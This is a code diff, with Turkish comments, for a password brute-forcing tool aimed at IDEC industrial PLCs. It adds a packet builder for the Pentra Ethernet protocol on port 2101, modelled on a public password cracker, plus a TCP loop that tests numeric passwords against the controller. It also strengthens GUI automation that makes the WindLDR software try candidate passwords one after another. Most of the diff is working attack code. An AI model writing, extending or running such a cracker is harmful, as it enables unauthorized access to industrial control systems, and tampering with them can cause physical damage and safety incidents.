@@ -141,6 +141,73 @@ def get_total_count(mode):
     }
     return counts.get(mode, n)
 
+def _conn_type_key(display_value):
+    """Bağlantı tipi combobox metnini sabit anahtara çevirir."""
+    v = (display_value or "").strip()
+    if "WindLDR" in v or "windldr" in v.lower():
+        return "windldr"
+    if "Pentra" in v:
+        return "pentra"
+    if "USB" in v or "Serial" in v:
+        return "serial"
+    if "Ethernet" in v:
+        return "ethernet"
+    if "Modbus" in v:
+        return "modbus"
+    return "serial"
+
+# --- IDEC Pentra (Ethernet port 2101) - Capkj2/Idec-password-cracker referansı ---
+PENTRA_DEFAULT_PORT = 2101
+PENTRA_PREAMBLE_HEX = "0546463057560000000000000000"  # 26 hex chars
+VALID_PASS_RESPONSE = bytes([0x06, 0x30, 0x31, 0x30, 0x33, 0x37, 0x0D])
+INVALID_PASS_RESPONSE = bytes([0x06, 0x30, 0x31, 0x32, 0x30, 0x35, 0x33, 0x30, 0x0D])
+
+def _pentra_build_packet(password_number):
+    """
+    IDEC Pentra paketi oluşturur (sayısal şifre).
+    Kaynak: https://github.com/Capkj2/Idec-password-cracker (Pass-code.cpp)
+    password_number: int (1-99999999)
+    Returns: 18-byte packet veya en fazla 18 byte (hex string 36 char, eksikse 00 ile doldurulur).
+    """
+    pad = 2
+    if password_number >= 10 and password_number < 100:
+        pad = 3
+    elif password_number >= 100 and password_number < 1000:
+        pad = 4
+    elif password_number >= 1000 and password_number < 10000:
+        pad = 5
+    elif password_number >= 10000 and password_number < 100000:
+        pad = 6
+    elif password_number >= 100000 and password_number < 1000000:
+        pad = 7
+    elif password_number >= 1000000 and password_number < 10000000:
+        pad = 8
+    elif password_number >= 10000000:
+        pad = 9
+    s = str(password_number).zfill(pad)
+    hs = s.encode().hex().upper()
+    packet_hex = list(PENTRA_PREAMBLE_HEX)
+    start = 12
+    for i, c in enumerate(hs):
+        if start + i < len(packet_hex):
+            packet_hex[start + i] = c
+    packet_hex = "".join(packet_hex)[:26]
+    cksm_hb = 0
+    cksm_lb = 0
+    for i in range(0, len(packet_hex), 2):
+        cksm_hb ^= ord(packet_hex[i])
+    for j in range(1, len(packet_hex), 2):
+        cksm_lb ^= ord(packet_hex[j])
+    cksm_hb ^= 0x33
+    cksm_lb ^= 0x30
+    if cksm_lb > 0x39:
+        cksm_lb += 0x07
+    packet_hex += "30" + f"{cksm_hb:02X}" + f"{cksm_lb:02X}" + "0D"
+    while len(packet_hex) < 36:
+        packet_hex += "00"
+    packet_hex = packet_hex[:36]
+    return bytes.fromhex(packet_hex)
+
 class IDECPasswordFinder:
     def __init__(self, root):
         self.root = root
@@ -177,10 +244,17 @@ class IDECPasswordFinder:
         
         # Bağlantı tipi
         ttk.Label(conn_frame, text="Bağlantı Tipi:").grid(row=0, column=0, sticky=tk.W, pady=5)
-        conn_type_values = ["USB/Serial", "Ethernet/IP", "Modbus TCP"]
+        conn_type_values = [
+            "USB/Serial (deneysel – protokol bilinmiyor)",
+            "IDEC Pentra Ethernet (port 2101, sayısal şifre)",
+            "Ethernet/IP (sadece port kontrolü, şifre testi yok)",
+            "Modbus TCP (sadece port kontrolü, şifre testi yok)",
+        ]
         if HAS_PYWINAUTO:
-            conn_type_values.append("WindLDR'da otomatik dene")
-        self.connection_type = tk.StringVar(value="USB/Serial")
+            conn_type_values.insert(0, "WindLDR'da otomatik dene (önerilen)")
+        self.connection_type = tk.StringVar(
+            value=conn_type_values[0] if conn_type_values else "USB/Serial (deneysel – protokol bilinmiyor)"
+        )
         conn_type_combo = ttk.Combobox(
             conn_frame,
             textvariable=self.connection_type,
@@ -189,6 +263,11 @@ class IDECPasswordFinder:
             width=24
         )
         conn_type_combo.grid(row=0, column=1, pady=5, padx=10)
+        ttk.Button(
+            conn_frame,
+            text="WindLDR penceresini tara (tanı)",
+            command=self.scan_windldr_controls
+        ).grid(row=0, column=2, pady=5, padx=5)
         
         # COM Port / IP
         ttk.Label(conn_frame, text="COM Port / IP:").grid(row=1, column=0, sticky=tk.W, pady=5)
@@ -320,7 +399,7 @@ class IDECPasswordFinder:
         info_label.pack(pady=2)
         usage_label = ttk.Label(
             main_frame,
-            text="WindLDR'da otomatik dene: WindLDR'ı açın, bağlantı/şifre penceresini açıp şifre kutusu görünür olsun. Program şifreleri orada otomatik dener.",
+            text="Önerilen: WindLDR'da otomatik dene — WindLDR'ı açın, bağlantı/şifre penceresini açıp şifre kutusu görünür olsun. COM modu deneyseldir (protokol dokümante değil).",
             font=("Arial", 8),
             foreground="gray",
             wraplength=720
@@ -397,15 +476,29 @@ class IDECPasswordFinder:
     
     def test_connection(self):
         """Bağlantıyı test et butonu"""
-        conn_type = self.connection_type.get()
+        conn_key = _conn_type_key(self.connection_type.get())
         conn_addr = self.connection_address.get().strip()
         if not conn_addr:
             messagebox.showwarning("Uyarı", "Önce COM Port veya IP girin.")
             return
-        if conn_type != "USB/Serial":
-            messagebox.showinfo("Bilgi", "Bağlantı testi şu an sadece USB/Serial için destekleniyor.")
+        if conn_key == "pentra":
+            self.log_message("Bağlantı test ediliyor (Pentra TCP 2101)...")
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                sock.connect((conn_addr, PENTRA_DEFAULT_PORT))
+                sock.close()
+                self.log_message(f"Pentra {conn_addr}:{PENTRA_DEFAULT_PORT} bağlantısı OK.")
+                messagebox.showinfo("Bağlantı tamam", f"Pentra {conn_addr}:{PENTRA_DEFAULT_PORT} bağlantısı kuruldu.")
+                return
+            except Exception as e:
+                self.log_message(str(e))
+                messagebox.showerror("Bağlantı hatası", f"Pentra {conn_addr}:{PENTRA_DEFAULT_PORT} bağlanılamadı.\n{e}")
+                return
+        elif conn_key != "serial":
+            messagebox.showinfo("Bilgi", "Bağlantı testi şu an USB/Serial ve IDEC Pentra için destekleniyor.")
             return
-        self.log_message("Bağlantı test ediliyor...")
+        self.log_message("Bağlantı test ediliyor (COM)...")
         self.root.update()
         status, msg = self.check_connection_serial(conn_addr, self.baud_rate.get())
         self.log_message(msg)
@@ -457,21 +550,39 @@ class IDECPasswordFinder:
             self.log_message(f"Hata: {str(e)}")
             return False
     
-    def test_password_ethernet(self, password, ip_address):
-        """Ethernet üzerinden şifre test eder"""
+    def test_password_pentra(self, password, ip_address, port=PENTRA_DEFAULT_PORT):
+        """
+        IDEC Pentra Ethernet (port 2101): Capkj2/Idec-password-cracker protokolü.
+        Şifre sadece sayısal olmalı (örn. 1234); metin şifreler False döner.
+        """
         try:
-            # Modbus TCP portu (502)
+            num = int(password) if password and str(password).strip().isdigit() else None
+            if num is None or num < 0 or num > 99999999:
+                return False
+            packet = _pentra_build_packet(num)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2.5)
+            sock.connect((ip_address, port))
+            sock.sendall(packet)
+            buf = sock.recv(64)
+            sock.close()
+            if len(buf) >= len(VALID_PASS_RESPONSE) and buf[:len(VALID_PASS_RESPONSE)] == VALID_PASS_RESPONSE:
+                return True
+            return False
+        except (ValueError, OSError, socket.error) as e:
+            self.log_message(f"Pentra hatası: {e}")
+            return False
+
+    def test_password_ethernet(self, password, ip_address):
+        """Ethernet üzerinden şifre test eder (Modbus TCP port 502 - sadece port kontrolü)."""
+        try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(2)
             result = sock.connect_ex((ip_address, 502))
             sock.close()
-            
             if result == 0:
-                # Port açık, şifre kontrolü yapılabilir
-                # Gerçek implementasyon IDEC protokolüne göre yapılmalı
                 return True
             return False
-            
         except Exception as e:
             self.log_message(f"Hata: {str(e)}")
             return False
@@ -488,6 +599,78 @@ class IDECPasswordFinder:
             return app, wins[0]
         except Exception as e:
             return None, f"WindLDR bulunamadı: {e}. WindLDR açık mı? Bağlantı penceresi açık mı?"
+
+    def _dump_control_tree(self, elem, depth=0, max_depth=8, lines=None):
+        """Pencere/kontrol ağacını metin olarak döndürür (tanı için). max_depth ile derinlik sınırı."""
+        if lines is None:
+            lines = []
+        if depth > max_depth:
+            return lines
+        try:
+            indent = "  " * depth
+            ctype = getattr(elem.element_info, "control_type", "?")
+            name = (elem.window_text() or "")[:60]
+            auto_id = getattr(elem.element_info, "automation_id", "") or ""
+            class_name = getattr(elem.element_info, "class_name", "") or ""
+            line = f"{indent}{ctype}"
+            if name:
+                line += f" text=\"{name}\""
+            if auto_id:
+                line += f" automation_id=\"{auto_id}\""
+            if class_name and class_name != ctype:
+                line += f" class=\"{class_name}\""
+            lines.append(line)
+        except Exception:
+            lines.append("  " * depth + "(okunamadı)")
+        try:
+            for child in elem.children():
+                self._dump_control_tree(child, depth + 1, max_depth, lines)
+        except Exception:
+            pass
+        return lines
+
+    def scan_windldr_controls(self):
+        """WindLDR penceresini bulup tüm kontrolleri log'a yazar (tanı / sürüm uyumu için)."""
+        if not HAS_PYWINAUTO:
+            messagebox.showwarning("Uyarı", "pywinauto yüklü değil. pip install pywinauto")
+            return
+        self.log_message("WindLDR taraması başlıyor...")
+        self.root.update()
+        app_or_none, win_or_msg = self._find_windldr_window()
+        if app_or_none is None:
+            self.log_message(f"Hata: {win_or_msg}")
+            messagebox.showerror("WindLDR bulunamadı", win_or_msg)
+            return
+        app, win = app_or_none, win_or_msg
+        try:
+            title = win.window_text()
+            self.log_message(f"Pencere başlığı: {title}")
+            self.log_message("-" * 50)
+            lines = self._dump_control_tree(win, max_depth=6)
+            for line in lines[:300]:  # ilk 300 satır
+                self.log_message(line)
+            if len(lines) > 300:
+                self.log_message(f"... ve {len(lines) - 300} satır daha (kısaltıldı).")
+            self.log_message("-" * 50)
+            edit, btn = self._get_windldr_password_and_button(win)
+            if edit:
+                try:
+                    self.log_message("Bulunan şifre alanı: " + (edit.window_text() or "") + " " + (getattr(edit.element_info, "automation_id", "") or ""))
+                except Exception:
+                    self.log_message("Bulunan şifre alanı: (detay alınamadı)")
+            else:
+                self.log_message("Şifre alanı (Edit) bulunamadı.")
+            if btn:
+                try:
+                    self.log_message("Bulunan Bağlan butonu: " + (btn.window_text() or ""))
+                except Exception:
+                    self.log_message("Bulunan Bağlan butonu: (detay alınamadı)")
+            else:
+                self.log_message("Bağlan/OK butonu bulunamadı.")
+            self.log_message("Tarama tamamlandı.")
+        except Exception as e:
+            self.log_message(f"Tarama hatası: {e}")
+            messagebox.showerror("Hata", str(e))
     
     def _get_windldr_password_and_button(self, win):
         """Pencerede şifre Edit ve Bağlan/OK butonunu bulur. (edit, button) veya (None, None)."""
@@ -543,9 +726,9 @@ class IDECPasswordFinder:
             time.sleep(delay_small)
             connect_btn.click_input()
             time.sleep(delay_after_click)
-            # Hata penceresi var mı kontrol et (yanlış şifre vb.)
+            desktop = PywinautoDesktop(backend="uia")
+            # Önce hata penceresi var mı kontrol et (yanlış şifre vb.)
             try:
-                desktop = PywinautoDesktop(backend="uia")
                 for dlg in desktop.windows():
                     try:
                         t = (dlg.window_text() or "").strip()
@@ -572,7 +755,21 @@ class IDECPasswordFinder:
                         pass
             except Exception:
                 pass
-            # Hata kutusu yoksa bağlantı başarılı olabilir
+            # Pozitif başarı: herhangi bir pencerede "Connected" / "Bağlı" / "Online" var mı?
+            try:
+                for w in desktop.windows():
+                    try:
+                        title = (w.window_text() or "").strip()
+                        if not title:
+                            continue
+                        title_lower = title.lower()
+                        if any(x in title_lower for x in ("connected", "bağlı", "online", "connected to", "bağlandı")):
+                            return True
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+            # Hata kutusu yok ve "Connected" görünmüyorsa da bağlantı başarılı sayılabilir (dialog kapandıysa)
             return True
         except Exception as e:
             self.log_message(f"WindLDR deneme hatası: {e}")
@@ -589,19 +786,22 @@ class IDECPasswordFinder:
         mode_key = self.mode_to_key.get(self.search_mode.get(), "list_4")
         total_passwords = get_total_count(mode_key)
         
+        conn_key = _conn_type_key(conn_type)
         self.log_message("="*60)
         self.log_message("Şifre araması başlatılıyor...")
         self.log_message(f"Bağlantı Tipi: {conn_type}")
         self.log_message(f"Toplam denenecek şifre: {total_passwords:,}")
-        if conn_type == "WindLDR'da otomatik dene":
+        if conn_key == "windldr":
             self.log_message("WindLDR penceresinde şifreler otomatik denenecek (şifre alanı + Bağlan butonu).")
-        elif conn_type == "USB/Serial":
-            self.log_message("Not: PLC muhtemelen sadece WindLDR'a yanıt verir; otomatik denemede 'şifre bulundu' çıkmayabilir.")
+        elif conn_key == "serial":
+            self.log_message("Not: COM modu deneyseldir; IDEC protokolü bilinmiyor, PLC yanıt vermeyebilir.")
+        elif conn_key == "pentra":
+            self.log_message("IDEC Pentra Ethernet (port 2101) — sadece sayısal şifreler denenecek (kaynak: Capkj2/Idec-password-cracker).")
         self.log_message("="*60)
         
         password_edit_wldr = None
         connect_btn_wldr = None
-        if conn_type == "WindLDR'da otomatik dene":
+        if conn_key == "windldr":
             app_or_none, win_or_msg = self._find_windldr_window()
             if app_or_none is None:
                 self.log_message(f"Hata: {win_or_msg}")
@@ -622,7 +822,7 @@ class IDECPasswordFinder:
             win.set_focus()
         
         ser_handle = None  # COM port tek seferde açılıp tüm denemede kullanılır (hız)
-        if conn_type == "USB/Serial":
+        if conn_key == "serial":
             try:
                 fast = self.fast_mode.get()
                 ser_handle = serial.Serial(
@@ -652,21 +852,39 @@ class IDECPasswordFinder:
                 self.status_label.config(text=f"Deneniyor: {display_password} ({index:,}/{total:,})")
                 
                 success = False
-                if conn_type == "USB/Serial":
+                if conn_key == "serial":
                     if ser_handle:
                         success = self.test_password_serial(password, conn_addr, self.baud_rate.get(), ser=ser_handle)
                     else:
                         success = self.test_password_serial(password, conn_addr, self.baud_rate.get())
-                elif conn_type == "Ethernet/IP" or conn_type == "Modbus TCP":
+                elif conn_key == "pentra":
+                    success = self.test_password_pentra(password, conn_addr, PENTRA_DEFAULT_PORT)
+                elif conn_key in ("ethernet", "modbus"):
                     success = self.test_password_ethernet(password, conn_addr)
-                elif conn_type == "WindLDR'da otomatik dene" and password_edit_wldr and connect_btn_wldr:
+                elif conn_key == "windldr" and password_edit_wldr and connect_btn_wldr:
                     try:
                         success = self.try_password_windldr(password, password_edit_wldr, connect_btn_wldr)
                     except Exception as e:
                         self.log_message(f"WindLDR deneme hatası: {e}")
-                        if "invalid" in str(e).lower() or "cannot find" in str(e).lower():
-                            success = True
-                            self.found_password = password
+                        # Kontrol referansı geçersiz olmuş olabilir; hemen yeniden tara
+                        app_or_none, win_or_msg = self._find_windldr_window()
+                        if app_or_none is not None:
+                            _, win = app_or_none, win_or_msg
+                            pe, cb = self._get_windldr_password_and_button(win)
+                            if pe is not None and cb is not None:
+                                password_edit_wldr, connect_btn_wldr = pe, cb
+                            else:
+                                password_edit_wldr, connect_btn_wldr = None, None
+                        else:
+                            password_edit_wldr, connect_btn_wldr = None, None
+                    # Her 40 denemede bir WindLDR referanslarını tazele (pencere/control değişebilir)
+                    if conn_key == "windldr" and index % 40 == 0 and index > 0 and (password_edit_wldr or connect_btn_wldr):
+                        app_or_none, win_or_msg = self._find_windldr_window()
+                        if app_or_none is not None:
+                            _, win = app_or_none, win_or_msg
+                            pe, cb = self._get_windldr_password_and_button(win)
+                            if pe is not None and cb is not None:
+                                password_edit_wldr, connect_btn_wldr = pe, cb
                 
                 if success:
                     self.found_password = password
@@ -712,12 +930,13 @@ class IDECPasswordFinder:
     def start_search(self):
         """Aramayı başlatır"""
         conn_type = self.connection_type.get()
+        conn_key = _conn_type_key(conn_type)
         conn_addr = self.connection_address.get().strip()
-        if conn_type != "WindLDR'da otomatik dene" and not conn_addr:
+        if conn_key != "windldr" and not conn_addr:
             messagebox.showerror("Hata", "Lütfen COM Port veya IP adresi girin!")
             return
         
-        if conn_type == "USB/Serial":
+        if conn_key == "serial":
             status, msg = self.check_connection_serial(conn_addr, self.baud_rate.get())
             if status == "port_error":
                 messagebox.showerror(
